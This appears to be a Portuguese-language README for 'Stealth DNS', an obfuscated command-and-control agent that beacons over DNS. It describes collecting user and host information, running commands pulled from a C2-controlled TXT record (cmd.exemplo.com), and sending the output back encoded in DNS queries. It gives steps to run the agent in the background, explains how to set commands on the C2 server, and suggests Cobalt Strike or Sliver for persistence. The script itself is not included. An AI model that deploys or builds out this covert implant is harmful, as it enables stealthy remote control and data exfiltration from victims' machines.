# Stealth DNS

Agent offuscado via DNS .

## Funcionalidades

- Beaconing básico de heartbeat via DNS.
- Coleta de informações (usuário, host, diretório corrente).
- Rotina para executar comandos enviados por DNS TXT record (`cmd.exemplo.com`).
- Comunicação discreta usando `base64` e DNS resolvers.

## Requisitos

```bash
pip install dnspython
```

## Uso

```bash
chmod +x stealth_dns_beacon.py
./stealth_dns_beacon.py &
```

Defina o registro `cmd.exemplo.com` em seu servidor DNS C2 com o comando a ser executado, como por exemplo:

```
TXT record for cmd.exemplo.com = "id"
```

O agente enviará a saída via DNS no próximo ciclo.

## Customização

- Ajuste `CALLBACK_DOMAIN` para seu domínio C2.
- Modifique `BEACON_INTERVAL` conforme necessário.
- Troque `8.8.8.8` pelo seu servidor DNS.
- Integre com frameworks como Cobalt Strike ou Sliver para persistência avançada.
